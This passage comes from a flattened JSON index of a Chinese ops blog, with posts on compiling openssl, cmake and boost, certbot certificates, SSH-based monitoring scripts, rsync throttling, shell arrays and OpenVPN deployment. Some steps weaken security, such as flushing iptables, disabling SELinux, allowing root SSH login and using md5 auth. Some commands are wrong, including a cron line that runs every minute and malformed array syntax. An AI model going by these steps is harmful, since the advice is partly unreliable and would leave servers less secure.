&#x2F;usr&#x2F;local&#x2F;openvpn&#x2F;sbin&#x2F;openvpn --config &#x2F;etc&#x2F;openvpn&#x2F;server.conf &gt; &#x2F;tmp&#x2F;open.log 2&gt;&amp;1 &amp; if [ $? -eq 0 ];then echo &quot;警告: $USER账号已被注销, 即刻生效!&quot;firm $TMP2fi","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"openvpn","slug":"openvpn","permalink":"https://garywu520.github.io/tags/openvpn/"},{"name":"expect","slug":"expect","permalink":"https://garywu520.github.io/tags/expect/"},{"name":"easyrsa","slug":"easyrsa","permalink":"https://garywu520.github.io/tags/easyrsa/"},{"name":"ssh免交互","slug":"ssh免交互","permalink":"https://garywu520.github.io/tags/ssh%E5%85%8D%E4%BA%A4%E4%BA%92/"},{"name":"免交互","slug":"免交互","permalink":"https://garywu520.github.io/tags/%E5%85%8D%E4%BA%A4%E4%BA%92/"}]},{"title":"编译安装cmake3和boost1.65","slug":"编译安装cmake3和boost1-65","date":"2018-09-07T12:55:58.000Z","updated":"2018-09-07T12:58:15.431Z","comments":true,"path":"2018/09/07/编译安装cmake3和boost1-65/","link":"","permalink":"https://garywu520.github.io/2018/09/07/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85cmake3%E5%92%8Cboost1-65/","excerpt":"1编译安装cmake3和boost1.65版本 编译安装cmake3.10123456wget https:&#x2F;&#x2F;cmake.org&#x2F;files&#x2F;v3.10&#x2F;cmake-3.10.2.tar.gztar -zxvf cmake-3.10.2.tar.gzcd cmake-3.10.2.&#x2F;bootstrap --prefix&#x3D;&#x2F;usrmake &amp;&amp; sudo make installcmake --version","text":"1编译安装cmake3和boost1.65版本 编译安装cmake3.10123456wget https:&#x2F;&#x2F;cmake.org&#x2F;files&#x2F;v3.10&#x2F;cmake-3.10.2.tar.gztar -zxvf cmake-3.10.2.tar.gzcd cmake-3.10.2.&#x2F;bootstrap --prefix&#x3D;&#x2F;usrmake &amp;&amp; sudo make installcmake --version 编译安装bootst1.65.112345678910111213141516wget https:&#x2F;&#x2F;dl.bintray.com&#x2F;boostorg&#x2F;release&#x2F;1.65.1&#x2F;source&#x2F;boost_1_65_1.tar.gztar zxvf boost_1_65_1.tar.gz使用bootstrap来生成编译工具b2sudo .&#x2F;bootstrap.sh 使用b2安装sudo .&#x2F;b2 install 安装Boost.Build(1)进入&quot;tools&#x2F;build&quot;目录 cd tools&#x2F;build(2)使用 bootstrap来生成编译工具b2 sudo .&#x2F;bootstrap.sh(3)使用b2安装 sudo .&#x2F;b2 install 123456查看boost版本cat &#x2F;usr&#x2F;local&#x2F;include&#x2F;boost&#x2F;version.hpp | grep &quot;BOOST_LIB_VERSION&quot;结果如下：&#x2F;&#x2F; BOOST_LIB_VERSION must be defined to be the same as BOOST_VERSION#define BOOST_LIB_VERSION &quot;1_65_1&quot;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"cmake3","slug":"cmake3","permalink":"https://garywu520.github.io/tags/cmake3/"},{"name":"boost","slug":"boost","permalink":"https://garywu520.github.io/tags/boost/"}]},{"title":"编译安装openssl","slug":"编译安装openssl","date":"2018-09-07T12:40:12.000Z","updated":"2018-12-13T06:10:08.198Z","comments":true,"path":"2018/09/07/编译安装openssl/","link":"","permalink":"https://garywu520.github.io/2018/09/07/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openssl/","excerpt":"123本文主要记录openssl编译安装以及lib库的正确加载问题注：如果之前有yum或apt安装过openssl，建议卸载干净再继续。不建议手动删除老版本文件，否则后果可能很严重。","text":"123本文主要记录openssl编译安装以及lib库的正确加载问题注：如果之前有yum或apt安装过openssl，建议卸载干净再继续。不建议手动删除老版本文件，否则后果可能很严重。 编译安装openssl 官网：下载 12345wget https:&#x2F;&#x2F;www.openssl.org&#x2F;source&#x2F;openssl-1.0.2p.tar.gztar -xzf openssl-1.0.2p.tar.gzcd openssl-1.0.2p.&#x2F;config --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;opensslmake &amp;&amp; make install 123456命令软链【或添加环境变量均可】mv &#x2F;usr&#x2F;bin&#x2F;openssl &#x2F;usr&#x2F;bin&#x2F;openssl.bakln -sv &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;bin&#x2F;openssl &#x2F;usr&#x2F;bin&#x2F;opensslmv &#x2F;usr&#x2F;include&#x2F;openssl &#x2F;usr&#x2F;include&#x2F;openssl.bakln -sv &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;include&#x2F;openssl &#x2F;usr&#x2F;include&#x2F;openssl 12打印openssl库文件所依赖的共享库列表ldd &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;bin&#x2F;openssl 1234567加载openssl新版lib库cat &#x2F;etc&#x2F;ld.so.conf新增如下行：&#x2F;usr&#x2F;local&#x2F;openssl&#x2F;lib生效ldconfig &#x2F;etc&#x2F;ld.so.conf 验证openssl版本 1openssl version -a","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"openssl","slug":"openssl","permalink":"https://garywu520.github.io/tags/openssl/"},{"name":"libssl","slug":"libssl","permalink":"https://garywu520.github.io/tags/libssl/"},{"name":"libcrypto","slug":"libcrypto","permalink":"https://garywu520.github.io/tags/libcrypto/"}]},{"title":"certbot免费证书申请","slug":"certbot免费证书申请","date":"2018-09-04T07:02:53.000Z","updated":"2018-09-04T07:09:15.064Z","comments":true,"path":"2018/09/04/certbot免费证书申请/","link":"","permalink":"https://garywu520.github.io/2018/09/04/certbot%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7/","excerpt":"1Let&#39;s Encrypt Certbot生成免费证书 Certbot官网：链接","text":"1Let&#39;s Encrypt Certbot生成免费证书 Certbot官网：链接 安装cerbot12345在certbot官网选择对应的操作系统，安装其提供的方法来安装certbotyum -y install yum-utilsyum-config-manager --enable rhui-REGION-rhel-server-extras rhui-REGION-rhel-server-optionalyum install -y certbot 使用certbot certonly命令,生成证书公私钥(支持多域名)1234567生成证书certbot certonly --webroot -w &#x2F;home&#x2F;sites&#x2F;webroot1 -d domain1.com或certbot certonly --webroot -w &#x2F;home&#x2F;sites&#x2F;webroot1 -d domain1.com -w &#x2F;home&#x2F;sites&#x2F;webroot2&#x2F; -d www.domain2.com此过程中 Certbot 会创建随机文件，然后远程验证域名及服务控制权新生成的证书及相关文件，将生成到 &#x2F;etc&#x2F;letsencrypt 路径下。 1234567&#x2F;etc&#x2F;letsencrypt目录结构：drwx------ 3 root root 4096 Aug 8 23:11 accountsdrwx------ 3 root root 4096 Aug 8 23:16 archivedrwxr-xr-x 2 root root 4096 Aug 8 23:16 csrdrwx------ 2 root root 4096 Aug 8 23:30 keysdrwx------ 3 root root 4096 Aug 8 23:16 live #这个是nginx可用证书目录drwxr-xr-x 2 root root 4096 Aug 8 23:25 renewal 配置Nginx 301跳转并配置SSL区域(指定SSL证书)123配置略, 配置完成需要重启nginx服务刷新浏览器访问网页就出现了绿色安全锁图标 最后为了保证证书长期可用，需要添加crond任务，每月自动续期1234crontab -e# 输入* * * *&#x2F;1 * &#x2F;usr&#x2F;bin&#x2F;certbot renew 1&gt;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 注意事项123(1) Let&#39;s Encrypt 是单域绑定， 虽然支持多域名，但是不支持泛域绑定。(2) Let&#39;s Encrypt 需要每90天续期,请自行斟酌(3) 不支持IP地址绑定,必须指定域名 参考：Laravel China","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://garywu520.github.io/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://garywu520.github.io/tags/SSL/"},{"name":"免费SSL证书","slug":"免费SSL证书","permalink":"https://garywu520.github.io/tags/%E5%85%8D%E8%B4%B9SSL%E8%AF%81%E4%B9%A6/"},{"name":"crt","slug":"crt","permalink":"https://garywu520.github.io/tags/crt/"},{"name":"pem","slug":"pem","permalink":"https://garywu520.github.io/tags/pem/"},{"name":"certbot","slug":"certbot","permalink":"https://garywu520.github.io/tags/certbot/"},{"name":"Let's Encrypt","slug":"Let-s-Encrypt","permalink":"https://garywu520.github.io/tags/Let-s-Encrypt/"},{"name":"SSL证书自动续签","slug":"SSL证书自动续签","permalink":"https://garywu520.github.io/tags/SSL%E8%AF%81%E4%B9%A6%E8%87%AA%E5%8A%A8%E7%BB%AD%E7%AD%BE/"}]},{"title":"shell脚本中嵌入ssh无密钥登陆","slug":"shell脚本中嵌入ssh无密钥登陆","date":"2018-08-31T06:17:21.000Z","updated":"2018-08-31T07:36:19.919Z","comments":true,"path":"2018/08/31/shell脚本中嵌入ssh无密钥登陆/","link":"","permalink":"https://garywu520.github.io/2018/08/31/shell%E8%84%9A%E6%9C%AC%E4%B8%AD%E5%B5%8C%E5%85%A5ssh%E6%97%A0%E5%AF%86%E9%92%A5%E7%99%BB%E9%99%86/","excerpt":"适用场景1有这样一个生产场景: zabbix-agent只在server1服务器有安装并提供监控服务，想使用这一台server1服务器通过编写shell脚本去监控其他服务器运行的服务，比如：服务运行状态、log日志统计并发等等。如何做？","text":"适用场景1有这样一个生产场景: zabbix-agent只在server1服务器有安装并提供监控服务，想使用这一台server1服务器通过编写shell脚本去监控其他服务器运行的服务，比如：服务运行状态、log日志统计并发等等。如何做？ 场景分析 1server1需要与其他server创建SSH互信，shell中通过ssh来远程登陆到其他服务器来执行命令。那么问题来了？命令执行完成，如何在shell中退出并将命令执行后的结果返回到server1中，并让zabbix去监控呢？ 案例将server1的密钥上传到101服务器实现ssh互信123456789101112131415161718192021222324252627282930313233343536373839404142434445首先在server1以root命令生成SSH密钥[root@web01 ~]# ssh-keygen -t dsaGenerating public&#x2F;private dsa key pair.Enter file in which to save the key (&#x2F;root&#x2F;.ssh&#x2F;id_dsa):Created directory &#39;&#x2F;root&#x2F;.ssh&#39;.Enter passphrase (empty for no passphrase):Enter same passphrase again: Your identification has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_dsa.Your public key has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub.The key fingerprint is:25:93:78:e9:01:2d:82:db:cb:0b:34:f7:0c:a9:1b:11 root@web01The key&#39;s randomart image is:+--[ DSA 1024]----+| . .. || E . .o.o || + o..B . || &#x3D; &#x3D; o &#x3D; || . * &#x3D; S || + o o || + . || . . || |+-----------------+#检查密钥文件[root@web01 ~]# ll &#x2F;root&#x2F;.ssh&#x2F;total 8-rw------- 1 root root 736 2017-08-06 15:17 id_dsa-rw-r--r-- 1 root root 600 2017-08-06 15:17 id_dsa.pub#将生成的.pub密钥上传到所需的服务器上（比如：101），实现ssh免密登陆 ssh-copy-id -i ~&#x2F;.ssh&#x2F;id_dsa.pub root@10.10.10.101 #确认远端101服务器密钥上传成功[root@101 ~]# ll &#x2F;root&#x2F;.ssh&#x2F;total 8-rw------- 1 root root 600 2017-08-06 15:29 authorized_keys-rw-r--r-- 1 root root 393 2017-08-05 11:03 known_hosts#在server1服务器无密码远程登录测试[root@web01 ~]# ssh root@10.10.10.101注意：如果远程登录失败,需要配置ssh允许root登录，并重启ssh服务。 在101服务器生成密钥上传到server1服务器，实现反向ssh互信1在101服务器，生成dsa密钥，并上传到server1服务器，实现互信。 脚本编写123接下来就可以愉快的在server1编写所需的shell脚本了，范例如下：[root@web01 ~]# cat &#x2F;opt&#x2F;check_service.sh 1234567891011121314151617#!&#x2F;bin&#x2F;bashDNS_IP&#x3D;10.0.0.101FILE1&#x3D;&#x2F;var&#x2F;log&#x2F;dns.logFILE2&#x3D;&#x2F;tmp&#x2F;pri_dns.logNOW_UNIX&#x3D;&#96;date +%s&#96;UNIX&#x3D;&#96;expr $&#123;NOW_UNIX&#125; - 60&#96; #本地文件清理rm -f $FILE2#SSH DNS并发信息获取ssh root@$&#123;DNS_IP&#125; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &lt;&lt; EOF egrep &quot;$&#123;UNIX&#125;&quot; $FILE1|wc -l &gt;$FILE2 scp -r $FILE2 root@server1:&#x2F;tmp&#x2F; exitEOF 1234567891011脚本逻辑：(1)定义所需环境变量(2)通过如下方式在shell中嵌入SSH远程登录并在远程服务器执行命令 ssh root@10.10.10.101 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &lt;&lt; EOF comm1... comm2... comm3... exit EOF在上面的例子中，远端执行完毕后，通过scp方式，将结果传输到server1服务器的&#x2F;tmp目录下，最后再编写zabbix自定义key来实现监控。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"shell脚本","slug":"shell脚本","permalink":"https://garywu520.github.io/tags/shell%E8%84%9A%E6%9C%AC/"}]},{"title":"rsync限速实例","slug":"rsync限速实例","date":"2018-08-31T03:54:35.000Z","updated":"2018-08-31T04:02:31.533Z","comments":true,"path":"2018/08/31/rsync限速实例/","link":"","permalink":"https://garywu520.github.io/2018/08/31/rsync%E9%99%90%E9%80%9F%E5%AE%9E%E4%BE%8B/","excerpt":"场景介绍1生产环境有这样的需求，需要跨机房传输TB级文件，但又不想其带宽占用的太厉害而影响了其他业务，这时候就需要使用rsync的限速功能了，简单扯下","text":"场景介绍1生产环境有这样的需求，需要跨机房传输TB级文件，但又不想其带宽占用的太厉害而影响了其他业务，这时候就需要使用rsync的限速功能了，简单扯下 rsync限速参数: –bwlimit12345--bwlimit&#x3D;100 单位：KBPS, 100意思是 传输速度限制100KB&#x2F;s，也就是限速大概1MB的速度。再比如：想要限速50MB的速度，那么应该设置为 --bwlimit&#x3D;5000 rsync限速传输命令1参考：time rsync --port 873 -ravPz .&#x2F;2018* rsync@X.X.X.X::logfile&#x2F;2018&#x2F;H5&#x2F;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"rsync","slug":"rsync","permalink":"https://garywu520.github.io/tags/rsync/"},{"name":"rsync限速","slug":"rsync限速","permalink":"https://garywu520.github.io/tags/rsync%E9%99%90%E9%80%9F/"},{"name":"bwlimit","slug":"bwlimit","permalink":"https://garywu520.github.io/tags/bwlimit/"}]},{"title":"shell数组","slug":"shell数组","date":"2018-08-28T09:24:20.000Z","updated":"2018-08-29T10:44:38.462Z","comments":true,"path":"2018/08/28/shell数组/","link":"","permalink":"https://garywu520.github.io/2018/08/28/shell%E6%95%B0%E7%BB%84/","excerpt":"1shell数组","text":"1shell数组 数组的定义12345678910111213141516在Shell中，用括号来表示数组, 数组元素使用“空格” 分隔开，如：#数组定义name&#x3D;(tom jerry jackson free gary) #读取数组读取数组元素值的一般格式是：$&#123;数组名[下标]&#125;，注：下标是从0开始的例如：echo $&#123;name[0]&#125; #获取第1个元素值echo $&#123;name[1]&#125; #获取第2个元素值echo $&#123;name[2]&#125; #获取第3个元素值使用“*”或“@”符号可以获取数组中的所有元素echo $&#123;name&#x3D;[*]&#125;echo $(name&#x3D;[@]) 数组删除12345678910直接通过：&quot;unset 数组[下标]&quot; 可以清除相应的元素；若不带下标，则清除整个数据。 只清除第1个元素a&#x3D;(1 2 3 4 5)unset a[0]echo $&#123;a[*]&#125;2 3 4 5清除整个数组元素unset a 数组之分片12345678910111213141516直接通过 &quot;$&#123;数组名[@或*]:起始位置:长度&#125;&quot; 切片原先数组,然后返回字符串。如下：a&#x3D;(1 2 3 4 5) #定义数组echo $&#123;a[@]:0:3&#125; #分片 1 2 3echo $&#123;a[@]:1:4&#125;2 3 4 5如果加上”()”，将得到切片数组，下面例子中，c就是一个新数据。c&#x3D;($&#123;a[@]:1:4&#125;)echo $&#123;#c[@]&#125; #统计新数据c的元素总个数4echo $&#123;c[*]&#125; #重新打印c的新数据数组 2 3 4 5 数组之替换1234567891011121314调用方法是：&quot;$&#123;数组名[@或*]&#x2F;查找字符&#x2F;替换字符&#125;&quot; 注：该操作不会改变原先数组内容，如果需要修改，可以看下面例子，重新定义数据。# name&#x3D;(gary tom jerry jackson) # echo $&#123;name[@]&#x2F;jackson&#x2F;green&#125; #查找字符jackson，替换字符为greengary tom jerry green# echo $&#123;name[@]&#125; #可以看到，数组替换不会改变原数组的内容gary tom jerry jackson# name2&#x3D;($&#123;name[@]&#x2F;jackson&#x2F;green&#125;) #但可以进行重新赋值来实现数组替换# echo $&#123;name2[@]&#125;gary tom jerry green 1关于数组相关shell案例，有时间补充。。。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"数组","slug":"数组","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E7%BB%84/"}]},{"title":"OpenVPN编译安装部署","slug":"OpenVPN编译安装部署","date":"2018-08-23T01:43:46.000Z","updated":"2018-08-23T02:30:24.380Z","comments":true,"path":"2018/08/23/OpenVPN编译安装部署/","link":"","permalink":"https://garywu520.github.io/2018/08/23/OpenVPN%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/","excerpt":"1整理下OpenVPN编译安装+部署过程，尤其是向客户端push路由、证书创建与吊销等相关技术。最后还会说明下客户端如何高可用实现逻辑负载均衡。","text":"1整理下OpenVPN编译安装+部署过程，尤其是向客户端push路由、证书创建与吊销等相关技术。最后还会说明下客户端如何高可用实现逻辑负载均衡。 编译安装环境准备12345678910111213141516171819202122232425262728293031323334启动并清空iptables规则 # iptables -F # service iptables save # service iptables restart 关闭SELINUX # setenforce 0 # vi &#x2F;etc&#x2F;sysconfig&#x2F;selinux 修改为SELINUX&#x3D;disabled 开启服务器端路由转发功能 # vi &#x2F;etc&#x2F;sysctl.conf 改为 net.ipv4.ip_forward &#x3D; 1 # sysctl -p 设置nat转发（注：添加正确的OpenVPN客户端网络地址） # iptables -t nat -A POSTROUTING -s 172.101.101.0&#x2F;24 -o eth0 -j MASQUERADE 注：如果是VPS配置openvpn，需要把上面的“-o eth0”参数取消，否则无法上网。 设置iptables开放openvpn端口： # iptables -A INPUT -p TCP --dport 1194 -j ACCEPT # service iptables save # service iptables restart 时间同步(重要)： # yum install ntp # ntpdate asia.pool.ntp.org # vi &#x2F;etc&#x2F;rc.d&#x2F;rc.local 添加 &#x2F;usr&#x2F;bin&#x2F;ntpdate asia.pool.ntp.org 安装编译依赖库 # yum install -y openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig gcc gcc++ 下载openvpn： 官网123# tar -zxvf openvpn.2.3.10.tar.gz &amp;&amp; cd openvpn.2.3.10# .&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;openvpn# make &amp;&amp; make install 1234创建&#x2F;etc&#x2F;openvpn目录# mkdir -p &#x2F;etc&#x2F;openvpn# cp -rf &#x2F;root&#x2F;openvpn.2.3.10&#x2F;sample &#x2F;etc&#x2F;openvpn# cp &#x2F;etc&#x2F;openvpn&#x2F;sample&#x2F;sample-config-files&#x2F;server.conf &#x2F;etc&#x2F;openvpn 安装openvpn最新的easy-rsa，该包用来制作ca证书，服务端证书，客户端证书。最新的为easy-rsa31234567891011121314151617181920212223242526272829303132333435# wget -c https:&#x2F;&#x2F;github.com&#x2F;OpenVPN&#x2F;easy-rsa&#x2F;archive&#x2F;master.zip# unzip master.zip# mv easy-ras-master easy-rsa# cp -rf easy-rsa &#x2F;etc&#x2F;openvpn# cd &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3# cp vars.example vars# chmod +x vars修改Vars文件内的如下字段：set_var EASYRSA_REQ_COUNTRY &quot;CN&quot; &#x2F;&#x2F;根据自己情况更改set_var EASYRSA_REQ_PROVINCE &quot;Beijing&quot;set_var EASYRSA_REQ_CITY &quot;Tong&quot;set_var EASYRSA_REQ_ORG &quot;qingliu Certificate&quot;set_var EASYRSA_REQ_EMAIL &quot;shuiqingliu14@gmail.com&quot;set_var EASYRSA_REQ_OU &quot;My OpenVPN&quot; 创建服务端证书及KeyA. 进入&#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;目录初始化： .&#x2F;easyrsa init-pki B. 创建根证书 .&#x2F;easyrsa build-ca B1. 根据提示输入PEM密码，密码为：P**4 【务必要记住改密码，否则以后不能为证书签名】 B2. 还需要输入common name 通用名，配置为Moxiu。 C. 创建服务器端证书 .&#x2F;easyrsa gen-req server nopass D. 签约服务端证书 .&#x2F;easyrsa sign server server 根据提示输入”yes ” ,再输入刚才设置的PEM密码 D. 创建Diffie-Hellman，确保key穿越不安全网络的命令 .&#x2F;easyrsa gen-dh 创建客户端证书123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657A. 在&#x2F;root目录下，创建openvpn_users文件夹来存储所有客户端证书文件。 # mkdir &#x2F;root&#x2F;openvpn_users &amp;&amp; cd openvpn_users # cp -R &#x2F;root&#x2F;easy-rsa .&#x2F; # cd easy-rsa&#x2F;easyrsa3&#x2F; # cp vars.example vars B. 初始化 # .&#x2F;easyrsa init-pki C. 创建客户端key以及生成证书（记住生成是自己输入的密码） # .&#x2F;easyrsa gen-req test &#x2F;&#x2F;名字自己定义 D. 切换到Server证书目录下，将得到的test.req导入，然后签约证书# cd &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;# .&#x2F;easyrsa import-req &#x2F;root&#x2F;openvpn_users&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;reqs&#x2F;test.req test D. 用户签约，根据提示输入服务端CA密码 # .&#x2F;easyrsa sign client test E. 这一步很重要，看看生成的全部文件 (1)Server: [目录：&#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;文件夹] &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;ca.crt &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;reqs&#x2F;server.req &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;reqs&#x2F;test.req &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;private&#x2F;ca.key &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;private&#x2F;server.key &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;issued&#x2F;server.crt &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;issued&#x2F;test.crt &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;dh.pem (2) Client: [目录：&#x2F;etc&#x2F;openvpn&#x2F;clients&#x2F;easy-rsa&#x2F;文件夹] &#x2F;root&#x2F;openvpn_users&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;private&#x2F;test.key &#x2F;root&#x2F;openvpn_users&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;reqs&#x2F;test.req 这个文件被我们导入到了服务端文件所以那里也有 F. 拷贝服务器证书文件放到&#x2F;etc&#x2F;openvpn目录 进入&#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3目录 #cp pki&#x2F;ca.crt &#x2F;etc&#x2F;openvpn #cp pki&#x2F;private&#x2F;server.key &#x2F;etc&#x2F;openvpn #cp pki&#x2F;issued&#x2F;server.crt &#x2F;etc&#x2F;openvpn #cp pki&#x2F;dh.pem &#x2F;etc&#x2F;openvpn G. Client证书（集中放到一个文件夹下，给VPN用户使用） # mkdir &#x2F;root&#x2F;users # mkdir &#x2F;root&#x2F;users&#x2F;test &#x2F;&#x2F;内部文件夹以姓名全拼命名，方便下载这些密钥文件 # cd &#x2F;root&#x2F;users&#x2F;test&#x2F; # cp &#x2F;etc&#x2F;openvpn&#x2F;ca.crt .&#x2F; 拷贝CA证书到test目录下 # cp &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;issued&#x2F;test.crt .&#x2F; 拷贝（服务端路径）用户crt文件 # cp &#x2F;root&#x2F;openvpn_users&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;private&#x2F;test.key .&#x2F; 拷贝（客户端路径）用户key文件 查看 [root@OpenVPN test]# ls ca.crt test.crt test.key 生成ta.key【为了安全】1234567配置服务之前，需要生成配置文件需要的ta.key文件，并将ta.key放入&#x2F;etc&#x2F;openvpn目录下【注：客户端连接也要使用有此文件】# cd &#x2F;root&#x2F;# &#x2F;usr&#x2F;local&#x2F;openvpn&#x2F;sbin&#x2F;openvpn --genkey --secret ta.key# ls# cp ta.key &#x2F;etc&#x2F;openvpn&#x2F;# cp ta.key &#x2F;root&#x2F;users&#x2F;test 服务端配置文件123456789101112131415161718192021222324252627282930313233343536# vi &#x2F;etc&#x2F;openvpn&#x2F;server.conf local 10.0.8.28 #申明本机使用的IP地址，也可以不说明 port 1194 #申明使用的端口，默认1194 proto tcp #申明使用的协议，默认使用UDP，如果使用HTTP proxy，必须使用TCP协议 dev tun #申明使用的设备可选tap和tun，tap是二层设备，支持链路层协议。 ca &#x2F;etc&#x2F;openvpn&#x2F;ca.crt #指定ca证书的路径 cert &#x2F;etc&#x2F;openvpn&#x2F;server.crt #指定server.crt路径 key &#x2F;etc&#x2F;openvpn&#x2F;server.key #指定server.key路径 dh &#x2F;etc&#x2F;openvpn&#x2F;dh.pem #指定dh.pem路径 server 172.101.101.0 255.255.255.0 #为VPN客户端指定分配的网络地址（自己根据规划分配） ifconfig-pool-persist ipp.txt push &quot;redirect-gateway&quot; #向客户端push网关【push 网关后，客户端通过远程网络上网，作用类似NAT伪装；如果不想这么做，就需要向客户端直接push路由--后边故障解决部分有介绍】 push &quot;dhcp-option DNS 114.114.114.114&quot; #向客户端push DNS client-to-client #让客户端彼此可以互相访问 tls-auth &#x2F;etc&#x2F;openvpn&#x2F;ta.key 0 #注：此处客户端配置文件中该参数需要改为 tls-auth ta.key 1 comp-lzo auth md5 cipher AES-256-CBC max-clients 100 keepalive 10 120 persist-key persist-tun status openvpn-status.log verb 3 启动openvpn12345678910&#x2F;usr&#x2F;local&#x2F;openvpn&#x2F;sbin&#x2F;openvpn --config &#x2F;etc&#x2F;openvpn&#x2F;server.conf &amp;加入开机启动项【手动创建开机启动脚本文件】# vi &#x2F;etc&#x2F;init.d&#x2F;openvpn 输入以下内容，保存：#!&#x2F;bin&#x2F;bash# chkconfig: 2345 67 33# description: ntpd is the NTPv4 daemon.nohup &#x2F;usr&#x2F;local&#x2F;openvpn&#x2F;sbin&#x2F;openvpn --config &#x2F;etc&#x2F;openvpn&#x2F;server.conf &gt; &#x2F;tmp&#x2F;open.log 2&gt;&amp;1 &amp; 1234# chmod 755 openvpn &#x2F;&#x2F;添加执行权限# chkconfig --add openvpn# chkconfig openvpn on &#x2F;&#x2F;加入开机启动项# netstat -ln &#x2F;&#x2F;查看端口是否正确启动 客户端配置1此处以windows客户端为例：安装Openvpn客户端并以管理员身份运行 配置创建client.ovpn文件 12345678910111213141516clientdev tunproto udpremote 10.0.8.28 #主要这里修改成自己server ipresolv-retry infinitenobindpersist-keypersist-tunca ca.crt #这里需要证书cert test.crtkey test.keyauth md5cipher AES-256-CBCtls-auth ta.key 1comp-lzoverb 3 故障处理 1故障描述：运行openvpn客户端后，VPN连接正常，但无法上网和Ping公司内网 1234567891011解决方法： 1. 打开Openvpn服务端配置文件 # vi &#x2F;etc&#x2F;openvpn&#x2F;server.conf 添加如下静态路由(填写服务器这边的网络) push &quot;route 10.0.8.0 255.255.254.0 net_gateway&quot; push &quot;route 10.0.0.0 255.255.254.0 net_gateway&quot; #push &quot;route 10.0.16.0 255.255.248.0 net_gateway&quot; push &quot;route 0.0.0.0 0.0.0.0 net_gateway&quot; 重启openvpn服务，再进行测试即可 证书吊销12345678910111213OpenVPN证书吊销# cd &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;# .&#x2F;easyrsa revoke clientName &#x2F;&#x2F;name输入需要注销的用户名称# .&#x2F;easyrsa gen-crl此时会在&#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki目录下生成crl.pem文件# cp .&#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;crl.pem &#x2F;etc&#x2F;openvpn# cd &#x2F;etc&#x2F;openvpn# vim server.conf添加如下内容：crl-verify &#x2F;etc&#x2F;openvpn&#x2F;crl.pem重启OpenVPN服务,使配置生效 关于客户端逻辑负载均衡1234567891011为什么说客户端负载均衡是逻辑上的呢？实现逻辑是这样：部署多台独立的openvpn服务端，然后客户端配置多台server 